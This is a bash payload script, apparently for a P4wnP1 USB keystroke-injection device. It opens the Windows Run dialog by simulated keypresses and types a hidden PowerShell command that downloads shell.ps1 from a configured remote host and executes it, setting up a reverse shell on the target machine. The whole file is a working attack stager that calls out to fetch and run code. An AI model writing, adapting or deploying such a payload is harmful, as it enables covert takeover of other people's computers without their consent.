#!/bin/bash

### Description: Autorun payload that pulls and executes a remote PowerShell script
### Requirements: HID keyboard, hosted shell.ps1 file

CONFIG="/opt/p4wnp1-o2/config/reverse_shell.conf"
[ -f "$CONFIG" ] && source "$CONFIG"

HOST="${RS_HOST}"
SCRIPT="shell.ps1"

# Use the resolved HOST variable for the download URL
CMD="powershell -WindowStyle hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://$HOST/$SCRIPT')"
ESCAPED=$(echo "$CMD" | sed 's/"/\\"/g')

/opt/p4wnp1/tools/hid_injector inject "GUI r"
sleep 1
/opt/p4wnp1/tools/hid_injector type "$ESCAPED"
/opt/p4wnp1/tools/hid_injector inject "ENTER"

echo "[+] Autorun PowerShell downloader executed."
